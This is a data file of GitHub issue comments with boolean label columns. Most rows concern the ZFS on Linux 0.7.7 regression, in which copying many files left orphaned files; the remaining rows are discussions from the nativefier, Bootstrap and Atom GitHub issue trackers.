zfs/zfsonlinux/7401/379831296,"Compiler gcc version 6.4.0 (Gentoo Hardened 6.4.0-r1 p1.3) uname -a Linux baraddur 4.16.0-gentoo #1 SMP PREEMPT Wed Apr 4 121823 +08 2018 x86_64 AMD Ryzen Threadripper 1950X 16-Core Processor AuthenticAMD GNU/Linux distro gentoo hardened selinux coreutils version sys-apps/coreutils-8.28-r1 ZFS kmod from HEAD ZFS Loaded module v0.7.0-403_g1724eb62, ZFS pool version 5000, ZFS filesystem version 5 SELinux enforcing and permissive both hit it my normal cp binary cant repro even with 100k files debian binary also cant repro centos binary hits it instantly ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379832245,Reproducibility yes ZoL version zfs-0.7.7-1.el6.x86_64 Distribution name and version Scientific Linux 6.8 Kernel Version 2.6.32-696.23.1.el6.x86_64 Coreutils Version coreutils-8.4-46.el6.x86_64 SELinux status off ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379833634,"Reproducibility no Distribution name and version Arch Linux ZoL version This is ZFS build built from commit 533ea0415 . Kernel Version Linux kiste 4.15.15-1-ARCH #1 SMP PREEMPT Sat Mar 31 235925 UTC 2018 x86_64 GNU/Linux Coreutils Version SELinux status (enforcing, permissive, off/unused) off Unable to test CentOS 7  due to dependency on SELinux libraries (Arch doesn't support SELinux). ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379833847,"@friend Nice analysis! The salt is pretty weak (see ); I'm not sure why we didn't just use .  I wonder if they are actually getting the same exact hash, or if there's some weakness in the way that the salt is used in ?  zdb can dump the salt to see if they are the same. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379839977,We're working to get an 0.7.8 release out with  reverted ASAP. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379841623,"Would someone with a CentOS-family system please install  and . Then run  and post the output for me? It will save me some trouble of getting my hands on a system so that I can try to figure out what is different between CentOS's  and Gentoo's . I ran this on Gentoo's cp, which is coreutils 8.28 to get the files that were used to build  and after some commandline-foo, I have tentatively identified these as the patches relevant to  on CentOS ./coreutils-selinux.patch ./coreutils-8.22-selinux-optionsseparate.patch ./coreutils-8.22-non-defaulttests.patch ./coreutils-8.22-mv-hardlinksrace.patch ./coreutils-8.22-failingtests.patch ./coreutils-8.22-cp-sparsecorrupt.patch ./coreutils-8.22-cp-selinux.patch Unfortunately, the files used between coreutils versions could have changed, so I need to rerun that analysis on the output from a system using CentOS 6 or CentOS 7 to get a true list. I plan to review / test on Gentoo these patches to see if I can track down the issue from the user space side. Enough people are scrutinizing the kernel side that I'll delay tackling that until after I figured out what makes CentOS'  special. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379842270,I could set up a CentOS 7.4 VM but that could take an hour. Let me know if I should go on or if someone else has a system ready for testing. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379843055,"On 2018-04-09 1405, Richard Yao wrote CentOS 7.4 [root@friend ~]# gdb --ex 'info sources' /usr/bin/cp GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-100.el7_4.1 Copyright (C) 2013 Free Software Foundation, Inc. License GPLv3+ GNU GPL version 3 or later   is free software you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  Type ""show  copying"" and ""show warranty"" for details. This GDB was configured as ""x86_64-redhat-linux-gnu"". For bug reporting instructions, please see  symbols from /usr/bin/cp...Reading symbols from  /usr/bin/cp...(no debugging symbols found)...done. (no debugging symbols found)...done. No symbol table is loaded.  Use the ""file"" command. Missing separate debuginfos, use debuginfo-install  coreutils-8.22-18.el7.x86_64 ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379843380,@friend You are missing the debuginfo. Do  and try again. Output should look something like this ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379843455,Disregard my last wrong package... ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379845437,@friend Would you edit your post to use a pastebin? ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379845995,"On 2018-04-09 1417, Richard Yao wrote Sure. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379847631,"The patches that apply to cp as far as what gdb claims its source files are (with patches editing only test cases that do not apply to the cp binary removed) is the same as I got after processing the gdb output from Gentoo's cp, which is The changes in  look questionable to me, but I don't see a smoking gun. Testing it on Gentoo after applying these patches should allow us to figure out which one is making it reproducible. My guess is . ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379847890,"On 2018-04-09 1417, Richard Yao wrote ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379852431,Reproducibility no Distribution name and version Fedora 27 Kernel Version 4.15.10-300.fc27.x86_64 Coreutils Version 8.27-20.fc27 SELinux status off ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379854735,"Not reproducible using archzfs repo of Arch Linux (thanks, @friend). ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379858112,The 0.7.7 release has been removed from the CentOS and Fedora RPM repositories. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379859322,@friend confirmed that this is reproducible using  to create file in the right order (to inflate the zap with hash collisions). I'll post a minimal testcase. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379860680,@friend  you might want to look at the testcase in  first ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379863672,These changed the sorting  or ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379864218,@friend Nice find. That could explain things nicely if some tests with/without that confirm it is the difference. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379865895,@friend I just reproduced this in an old Gentoo VM that uses coreutils 8.21. It is affected. No redhat patches are in place there. I'll try reproducing with the patches that you linked and see what happens. I expect one of them to make the issue disappear. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379866211,You'll need this ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379866767,Shell script to reproduce (cp not needed) ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379866988,"No, actually you're going the other way around. Then you would need patch gnulib. Easier going back to unsorted from a recent version. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379868269,@friend I just realized that when I found that lib/savedir.c didn't exist in the source files that I have. I picked an old VM that just happened to have 8.21. I'll update it to 8.23 and then revert to verify things. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379868980,"I can reproduce it immediately by going with SAVEDIR_SORT_NONE. This explains why only old distros experience this. IIRC, tar is unsorted, so a  should be able to trigger this everywhere (untested). Obviously the hard-coded sequence from trisk's script also does it. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379870309,With @friend 's script I can immediately reproduce this on 64-bit Ubuntu 16.04 (kernel 4.4.0-109-generic) with ZFS 0.7.7. It fails as expected ` ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379872156,"@friend Yes, the actual code change is this ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379874743,"@friend I think we have satisfactorily explained what is different between various distributions that only the RHEL ones are affected. I am going to switch to understanding what is going wrong inside the kernel. I observed a link count corruption issue that persisted between umounts when I reproduced this, but I have had trouble reliably reproducing the problem so that I have a reproducer for the link count issue. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379875898,"I have now reproduced the bug on Arch Linux, using a corrected version of @friend's script (unexpected token error, line 6).  I am unable to reproduce the bug consistently ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379877139,"@friend Can confirm on Arch, too. This invalidates my previous comment. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379877454,"Using @friend's script (well, a slightly corrected version) I can reproduce this on an almost current version of the git tip, g1724eb62d, on Fedora 27 on a simple mirrored vdev in a VM. It doesn't happen on every run, but it happens reasonably frequently (at least half the time, I think). (This git version is the most recent version I've built for my own use. I can test with the very latest git tip, but I don't see anything there that would change this, if the identified cause is right. I'd be happy to test updates in the VM.) ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379878349,"It might be significant that we hit the zap expansion limit at 2048 files (unclear if this is because of the coreutils sorting, or the zap hash function, though). ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379883140,"The original reproducer creates orphaned files when it triggers, while @friend's reproducer does not. After running the original reproducer, I observed a failure on 1 file, 8186 files in the directory according to  and a directory size of 10001. Unlinking all of the files while trying to stat them to see if any were accessible failed, despite a directory size of 1816. Here is zdb output from a testpool that I used to reproduce the issue  forget how many times that I ran the reproducer on this (likely twice), but the orphaned files are clearly visible. Here is a compressed image of the pool  has sha256 5bf54d804f0cd6cd155cc781efeefdabaa6e0ddddc500695eb24061d802474ac.  The pool itself is just a 1GB sparse file. The compressed version is 1938032 bytes (~2MB) in size. Others can use zdb on it and poke around to observe the orphaned files. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379884429,"I am stepping out for a bit due to an appointment that I cannot preempt, but I just want to point out that those who lost files might still have them around as orphans. We'll need to examine a pool where this happened with files storing actual data to confirm that the data is there. If it is, the data could be recoverable. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379891384,"Thank you everyone for you help with this unfortunate regression. As described above by @friend the root cause of this issue is understood and a complete fix is currently being worked on.  In the meanwhile commit cc63068e95ee725cce03b1b7ce50179825a6cda5 which introduced this issue will be shortly reverted from the master branch, release branch, and v0.7.8 will be tagged.  We'll open a new PR with the full fix for review and feedback when it's ready. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379895691,"@friend There are still some loose ends. In particular, how are we going to deal with those affected by this? There could be orphan files in their datasets. At present, we could tell people to backup changes between what they have now and the snapshot before the issue happened, rollback and then restore, provided that they have snapshots at all. If not, the solution at the moment would be to make a new dataset, copy the files over to it and then destroy the old one. Neither is as clean a solution as doing something like  and having the orphaned files put into lost+found directories. It gets messier when we consider that orphaned files could be in recently made snapshots. This being hard to reproduce on non-RHEL family systems had been a loose end, but it was just tied. The change being in the bundled gnulib between coreutils 8.22 and 8.23 switched the order in how things had been copied from sequential order to a pseudo-random one. Finally, we had something like a dozen people around the world drop everything to work on this. Not all of us are yet on the same page yet and we will need some time to sync our understandings. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379897674,"I should add that we also need a way to check for the presence of orphans. I have confirmed that zdb can show it, but I have not yet determined what zdb would show in all cases (mainly, non-zero files) to allow reliable detection. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379898356,Our analysis so far has not determined how the additional files whose  completes after a prior zap expansion failure on the directory end up orphaned. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379899335,Our analysis is not finished. I am reopening this pending the completion of our analysis. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379903582,"Right I didn't mean to suggest this issue should be closed, and reverting the change was all that was needed.  There's still clearly careful investigation to be done, which we can now focus on. @friend when possible rolling back to a snapshot would be the cleanest way to recover these files.  However, since that won't always be an option let's investigate implementing a generic orhpan recovery mechanism.  Adding this functionality initially to  would allow us to check existing datasets, and would be nice additional test coverage for  to leverage.  We could potentially follow this up with support for a  directory. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379969486,"Given the improved understanding of the cause of this regression, can anything be said about the behaviour of rsync? If it reports no errors, are the data fine? What about mv? And what if mv is from one dataset to another, on the same pool? ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379973603,"@friend The mailing list or IRC chatroom would probably be a better place to ask, but  rsync should be fine, since I think it should bail out on e.g. rsync -a src/ dst/ once it gets ENOSPC once, and not try any additional files mv across datasets on a pool is just like mv across other filesystems, cp then rm, so I would guess that might be subject to the same caveats about version peculiarities as cp above, but I haven't tested that.  Also, one final caveat  knowledge, particularly about how much vulnerability exists for files that get lost in the metaphorical shuffle after getting back ENOSPC, is incomplete, so it's safest to revert versions if at all possible, and everything above is based on incomplete information.  ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379986385,"rsync always sorts files, so it should be fine. And as long as you don't receive errors, you should be fine. Since data is not silently lost, this is not the worst-case catastrophic bug, just a major annoyance. The most inconvenient issue about it are the orphaned files, but fortunately they are tied to their respective datasets, not to the entire pool, and can get rid of by rolling back or re-creating individual datasets. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/379990688,"Reproducibility yes ZoL version git, recent commit, 10adee27ced279c381816e1321226fce5834340c Distribution Ubuntu 17.10 Kernel Version 4.13.0-38-generic Coreutils Version 8.26-3ubuntu4 SELinux status not installed AFAICT Reproduced using  . Furthermore, this didn't look good The pool was freshly created as, I am trying to install the debug symbols for , however I am now also getting segfaults when not even touching this zpool. (spt-key is segfaulting when trying to trust the debug repo.) So I fear I better push the comment button now and reboot / ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380015910,Thanks for the solutions and quick efforts to fix. Are there any methods to check a complete filesystem if there any affected files. I do have backups but would be easier for me get a list of affected files. Thanks ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380035412,Given this bug has now been listed on The Register ( it might be wise have an FAQ article on the wiki page (with a link in this ticket). The FAQ article should clearly state which versions of ZoL are affected and which distros/kernel versions (similar to the birthhole bug). This would hopefully limit any panic concerns about the reliability of ZoL as a storage layer. ,False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380045208,"From that article (emphasis mine)  ""So even though three reviewers signed off on the cruddy commit, the speedy response may mean it’s possible to consider this a triumph of sorts for open source."" Ouch. I agree with @friend that there should be a FAQ article for that so we ZFS apologizers can point it to anyone who questions us about it. I would also like to suggest that the ZFS signing-off procedure be reviewed to avoid (or at least make it way more improbable) for such a ""cruddy commit""  to make it into a ZFS stable release, and that notice of this review also be added to that same FAQ article. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380065566,"In #7411, the  test looks like it may be a more robust reproducer (especially for future bugs) because it naturally relies on the ordering of the ZAP hashes. Also, if there are other reproducers, it might be a good idea to centralize discussion of them in that PR so they can be easily included. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380123393,"Answering my earlier question. Debian 9.3 as above. ♠rsync9999990mv /pool/dataset1/SRC /pool/dataset2/cp` doesn't fail either, so that doesn't prove much. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380144307,"locked the conversation so this issue doesn't blow up too much due to media attention, the mailing list is always a viable location for discussion, this will be unlocked when the analysis is complete and we've released a FAQ of sorts. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380151942,"FYI - you probably all saw it already, but we released zfs-0.7.8 with the reverted patch last night. ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380205514,"@friend We do not have a one liner yet. People are continuing to analyze the issue and we will have a proper fix in the near future. That will include a way to detect+correct the wrong directory sizes, list snapshots affected and place the orphaned files in some kind of lost+found directory. I am leaning toward extending scrub to do it. @friend @friend Here is what I propose. We can extend zpool to handle this by  Providing an errata toggle for ‘zpool scrub‘ that will search the pool for known errata and correct them to the best of its ability. Orphaned files could be placed into a top level dataset lost+found directory. I had considered going with .zfs/lost+found, but .zfs/lost+found would force mv to create a new file rather than a top level lost+found, which would just make a link for the existing one. The former might not be appropriate in all cases (e.g. deduplication on large files, large files on filled pools). We would need to handle collisions inside lost+found and add special handling for if the lost+found directory already exists with the immutable bit, but it seems both doable and the least bad option to me. Of course, we could always do both and have a switch somewhere to toggle it, but I would rather not go overboard by over-engineering a solution to get people’s files back for what I hope to be a one time event. Dumping details of what the special ‘zpool scrub‘ run corrected and what it needs the administrator to correct into ‘zpool status‘. Specifically, it should say what directories had their sizes corrected and which snapshots need to be deleted to purge the issue from the system. Letting ‘zpool clear‘ or a subsequent scrub wipe the information from zpool status.  We can also add a new feature flag that will allow the errata scrub to mark pools as being unimportable on certain versions of certain platforms in the future, so that those versions will fail to import the pools while saying that a later driver marked them as having a known intregrity bug. Then a force import to override it be needed. That way if this should ever happen again in a tagged release, we would not need to abuse feature flags to prevent a repaired pool from ending up imported on a buggy version. This might be more complicated to do in Illumos than in FreeBSD or Linux because Illumos distributions handle versioning, but I expect that it is doable. I still need to flesh out a few details, but that is the general gist of my thinking on how to deal with affected pools. What do you think? ",False,True,False,zfs/zfsonlinux/7401
zfs/zfsonlinux/7401/380212322,"@friend I have spent a fair amount of time explaining things to end users on Hacker News, Reddit and Phoronix. I do not think that our understanding is sufficient to post a final FAQ yet, but we could post an interim FAQ. Until then, you could point users to my hacker news post  specific, we need to nail down whether existing files could be lost, what if any other side effects happen when this is triggered, what course of events leads to directory entries disappearing after ENOSPC, whether those are just new ones or old ones too, how system administrators could detect it and how system administrators will repair it. Then we should be able to make a proper FAQ entry. Until then, I think the interim FAQ entry should advise users to upgrade ASAP to avoid having to possibly deal with orphaned files if nothing has happened yet, or more orphaned files if something has already happened; and not to change how they do things after upgrading unless they deem it necessary until we finish our analysis, make a proper fix, and issue proper instructions on how to repair the damage in the release notes. I do not think there is any significant harm to pools if datasets directory sizes are wrong and orphaned files exist while they wait for us to release a proper fix with instructions on how to completely address the issue, so telling them to wait after upgrading should be fine. ",False,True,False,zfs/zfsonlinux/7401
nativefier/jiahaog/29/127880569,It would be cool if you could enable page search using CMD + F for apps. Would be very useful for wikis. ,False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/173771603,"Electron does not support this, but it's possible with . ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/181408184,plus one for this. Find is something I use a lot in most web apps I use. ,False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/183611578,"plus one, I miss it on some apps ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/188658178,"plus one, really miss this  / ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/203495544,@friend any suggestions for how to use ? I can get it to return  like so but it doesn't scroll or highlight or do anything useful ,False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/203755943,I think you can use webContents.findInPageText()! ,False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/204725513,,False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/204726970,Maybe you need to use inspectServiceWorker() instead of toggleDevTools()? ,False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/252685362,"I've been using a couple webapps (Asana, Harvest, Slack) wrapped in nativefier for a couple months now.  I'm surprised how frequently (dozens of times per day) I try/need to use cmd-F to find something on the page and can't. ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/252693595,"plus one000 ) On Mon, Oct 10, 2016 at 1026 AM, Jon Brown notifications@friend.com wrote ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/272054062,"This project looks abandoned, but if somehow it isn't, here's a ready-to-use electron package to add search in page ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/272054176,"I'd LOVE this, its lack breaks many of my workflows  / ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/324127104,"Hi, I tried Nativefier in Linux and would be great to use the search. Also installed the link above by @friend, and tried to compile the app again, but nothing changed. How to use this in practice? Wouldn't it make sense to have it compiled into Nativefier, without any external tools? (Simply put why is this issue closed?) ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/324132071,"@friend the feature would make total sense, yes, PR welcome. We adjusted our triage rules, and indeed this issue shouldn't be closed, thanks for pointing it out 👍, re-opening. ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/324136698,"Today alone I missed this feature on 3 different occasions... On Tue, Aug 22, 2017 at 1226 PM, Binyomin Szanto-Varnagy  notifications@friend.com wrote ",False,True,False,nativefier/jiahaog/29
nativefier/jiahaog/29/400661273,"Yup it's a desired feature, everybody knows it and the upvotes on the issue make it clear. Locking conversation to avoid ""plus one"" comments; PR welcome 🙂. ",False,True,False,nativefier/jiahaog/29
bootstrap/twbs/8019/14891419,"Can someone help explain to me with the following styling in the latest Bootstrap make any sense whatsoever? h1, h2, h3 {     line-height 40px; } HTML headers are a great way show different levels of importance. Why on Earth would be make them all the same height. It's bad enough that my layouts seemed to get trashed every time I upgrade Bootstrap, but changes like this just seemed designed to mess things up. ",False,True,False,bootstrap/twbs/8019
bootstrap/twbs/8019/18638566,"Ease up on the attitude—there is no intended malice here. It made sense at the time given our uses, and that margins for the spacing are commonly overridden, but we've changed it in v3. Tighter, unit-less line-heights and margins on their way. ",False,True,False,bootstrap/twbs/8019
bootstrap/twbs/8019/18639960,"No, I never assumed malice. I'm sure there were some issues that I hadn't considered. But it's been a big effort fixing my site after that last update and I simply couldn't make sense of this one. Glad to see you've seen the light. ;) Thanks. ",False,True,False,bootstrap/twbs/8019
bootstrap/twbs/13327/31362386,"I'm having an issue with the pagination class causing it to respond differently depending on whether I am currently using MVC bundling. If I am not bundling, the 'class=pagination' MUST be set on a containing &lt;div&gt; for the pagination to show properly, not the &lt;ul&gt; (this is contrary to the documentation). When I am bundling, (optimizations set to true and/or using Release configuration), the 'class=pagination' attribute must be applied to the &lt;ul&gt;, as stated in the documentation. Now, this wouldn't be that annoying since I develop with bundling on to test optimizations anyways.  But, I'm still curious why this an issue because if I weren't using bundling I think this would be a greater problem. Has anyone else experienced this or is my system wonky? ",False,True,False,bootstrap/twbs/13327
bootstrap/twbs/13327/40256551,"Sorry, we can't help you with MVC-specific issues. Perhaps try asking on StackOverflow or on Microsoft support forums. ",False,True,False,bootstrap/twbs/13327
bootstrap/twbs/13327/40258584,Thanks for the unhelpful response.  You obviously didn't read the question because the issue is happening when bundling is DISABLED. The same error occurs when I include the bootstrap css in a &lt; link &gt; tag. But thanks for your 2 seconds anyways. ,False,True,False,bootstrap/twbs/13327
bootstrap/twbs/13327/40259544,"works just fine in our docs, even when I switch to our non-minified CSS, so the problem would appear to be on your end somewhere. We also don't support build systems other than our official Grunt one. ",False,True,False,bootstrap/twbs/13327
bootstrap/twbs/13327/40260002,"Slow your roll @friend. Your question isn't about Bootstrap in particular, it's about bundling and an MVC tool that we have absolutely no context for. @friend is 100% correct in pointing you elsewhere with an issue like this. We'll need more than a textual description to help you. The docs and source code clearly show usage of  elements. The CSS is dependent on a list HTML structure, too. There's no way this works on a  without some modifications or other errors in the codebase. Can you create a jsbin example that reproduces your problem? ",False,True,False,bootstrap/twbs/13327
bootstrap/twbs/13327/43139976,"Hello, I'm writing to apologize for my attitude in response to your previous replies.  I've discovered the source of my problems.  It seems someone on my team was using the pagination class incorrectly (applying it to a div instead of the ul) and modified the bootstrap.css sheet.  I noticed this by searching source control and comparing the bootstrap.min sheet to my development version (non-minified).  I noticed someone on my team entered the following changes and comments .pagination ul {  / Didn't have ul /   display inline-block;   padding-left 0;   margin 20px 0;   border-radius 4px; } .pagination ul &gt; li { / Didn't have ul /   display inline; } .pagination ul &gt; li &gt; a,  / Didn't have ul / .pagination  ul &gt; li &gt; span {   / Didn't have ul /   position relative;   float left;   padding 6px 12px;   margin-left -1px;   line-height 1.428571429;   text-decoration none;   background-color #ffffff;   border 1px solid #dddddd; } So again, sorry!! This was completely an error on my end.  Thanks for your time. ",False,True,False,bootstrap/twbs/13327
bootstrap/twbs/13327/43141135,Much appreciated @friend! ,False,True,False,bootstrap/twbs/13327
github/atom/1815/385859745,"Description As of Atom 1.33.0 and #1704 a large GitHub branding is now present in the status bar. While one could argue that the Git controls are relevant at any time in the Atom editor since a user may wish to initialize a repository there, no such origination ability is present in the GitHub component. The user of this plugin may be left with the feeling that this is merely brand placement without utility. GitHub functionality should only be shown once the context of a working Git repository -- or even further, a github.com repository -- is established. Steps to Reproduce  Install  plugin. Launch Atom, note GitHub branding all the time.  Expected behavior Only a Git component in the status bar. Actual behavior Both Git and GitHub components in the status bar. Reproduces how often 100% of the time when the plugin is enabled. Versions v1.33.0, independent of OS. Additional Information  ",False,True,False,github/atom/1815
github/atom/1815/443161536,"I agree, and the Github tab shows up next to the Git tab by default anyway, so discoverability is not an issue. I don't use Github and this new status bar button feels like wasted space and clutter to me. ",False,True,False,github/atom/1815
github/atom/1815/443231655,"I also would prefer if I could just turn it off entirely -- the  one is very useful to me, but I have no desire to log into github and use it inside of atom, this ends up just being a permanent clutter to me. ",False,True,False,github/atom/1815
bootstrap/twbs/9643/18129248,Chrome for Mac.  ,False,True,False,bootstrap/twbs/9643
bootstrap/twbs/9643/22733916,For now I'm going to leave this since those are two different nav lists. ,False,True,False,bootstrap/twbs/9643
bootstrap/twbs/9643/22734243,Surprised. ,False,True,False,bootstrap/twbs/9643
bootstrap/twbs/9643/22735360,"Dude, there's no need for attitude or sarcasm. We space out items in the navbar. If anything, this should have more margin or perhaps a border (but that'd be a lot trickier and dependent on DOM flow) given they are indeed separate lists of links. ",False,True,False,bootstrap/twbs/9643
bootstrap/twbs/9643/22735691,"Sorry about that; I'm a little tipsy. I'm just somewhat surprised, and wanted to express that. No hard feelings. ",False,True,False,bootstrap/twbs/9643
bootstrap/twbs/7482/12846560,The suggested usage of the  element within a  element in order to markup a subtext is incorrect usage of the  element. The HTML5 specification states that It then gives examples of small print A subtitle or subtext within a  element does not match the specification definition of small print and therefore the  should not be used in this manner. ,False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15981038,"I'm not too concerned with the spec honestly—it's an easy convention that folks can use, so we'll stick with it for now. Thanks though. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15982871,"You don't care about what the spec says? Don't you think you have a duty to promote good practices and proper use of tags rather than the complete opposite? On 5 Apr 2013 2314, ""Mark Otto"" notifications@friend.com wrote ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15983697,"I didn't say I didn't care, I said I'm not too concerned about it for this particular convention. To me, this is a good (and practical) practice that folks already use regardless of the spec. And having just reread the spec and their examples, I think you're mistaken on the validity of this convention. Take a look at that first example—sounds like a perfect use case that parallels our code. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15984277,"@friend The spec says &lt;small&gt; is valid anywhere phrasing content is expected, which fits with Bootstrap's usage. The word ""typically"" makes it clear that the specification's examples are not all-inclusive and implementors are free to expand on this list. @friend, don't disrespect the spec -P ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15984743,"I disagree. On 6 Apr 2013 0033, ""Donovan Buck"" notifications@friend.com wrote ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15985214,"@friend Normally I don't go any further into a discussion than this, but your brief reply has enticed me for one reason or another. Allow me to elaborate. The spec you linked to says the following And... And... The convention you disagree with,  tags within  tags, fits both those applications. Our own documentation a great example of this as well on  link and naming of the icon library is not necessary, nor is it primary content. It's an attribution, which the spec lists as an example. Moreover, it's a ""side comment"" or a ""short run of text""—both of which the spec encourages. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15985235,It is a similar thing to   instead of . Ppl like to use the first. ,False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15985772,Just check with   it doesn't throw error on this one. ,False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15986791,"The validator is not very strict and can only be used as a guide. The use of &lt;i&gt; for an icon is also contrary to the spec. Back to &lt;small&gt;, a sub title or sub text is not considered small print. Your example is an attribution but it is not a sub title which your documentation is implying would be acceptable. The content of the &lt;small&gt; element is key in deciding whether the element is suitable or not. The bootstrap documentation makes it appear that any content can appear in this context which, as you've shown, is not true. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15986987,"@friend That's an opinion, not an objective fact or statement from spec you're trying to defend. The spec says nothing about prescribing the use of small for subtitles or subtext. And we're not limited to the examples in the spec—those are examples and cannot, nor should they ever, represent all possible implementations. Of course, which is why any ""side comment"", ""short run of text"", or in this case a subtext or subtitle, can make use of the  element. That content is secondary. I call bullshit. Put nearly any phrase, string of words, attribution, links, or Emoji in there and you'll be fine. It's supporting content and that's just fine—by the spec, by me, and by everyone else. Specs aren't law—they're technical guidelines. Moreover, specs are almost never applicable or practical when building large scale design systems like Bootstrap or any other product. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15987065,"To inteject. I can see the point @friend is making. From an accessibility point of view the exact semantics of inline elements are of limited importance. To that end, using the language this way has no downsides, a subtitle or subtext does seem appropriate here. Just my 2c, (Edit, fixed typo) ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15988362,"@friend Oh rly? Tell something everyone don't know ¬¬ My point is in a huge app 6 chars can be a significant improvement if used in conjunction with a lot of other optimizations, and the change have no draw backs since the tag is empty and renders as any inline element. I never used, but as I said, ppl like to use. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/15988403,"Keep it classy @friend—no need for attitude or sarcasm. We're all just trying to make shit on the Internet here and have a debate. My general attitude is the best argument wins, and right now leaving it in makes a lot of sense to me. Hope others can see that as well given this thread. &lt;3 ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16021069,I have started a discussion on the HTML WG mailing list about use of &lt;small&gt; to indicate subtitles ,False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16027689,"@friend, I first encountered using small in this way in a suggestion by Toby Inkster in 2010 here  Made a lot of sense to me then, and still does. ",False,True,False,bootstrap/twbs/7482
bootstrap/twbs/7482/16068515,"would be more appropriate (in the future) for exactly these sorts of title-subtitle patterns, but unfortunately it's being marked for removal from the HTML5 spec at this late stage…which is unfortunate. ",False,True,False,bootstrap/twbs/7482
